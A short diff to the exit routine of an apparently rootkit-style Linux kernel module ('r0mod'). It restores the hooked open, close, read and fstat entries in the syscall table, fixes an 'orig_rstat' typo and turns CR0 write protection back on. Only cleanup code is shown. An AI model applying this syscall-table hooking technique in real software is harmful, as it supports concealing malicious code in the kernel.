@@ -127,7 +127,7 @@ static void __exit r0mod_exit(void)
         syscall_table[__NR_open] = (unsigned long)orig_open;
         syscall_table[__NR_close] = (unsigned long)orig_close;
         syscall_table[__NR_read] = (unsigned long)orig_read;
-        syscall_table[__NR_fstat] = (unsigned long)orig_rstat;
+        syscall_table[__NR_fstat] = (unsigned long)orig_fstat;
 
         write_cr0(read_cr0() | 0x10000);
     }
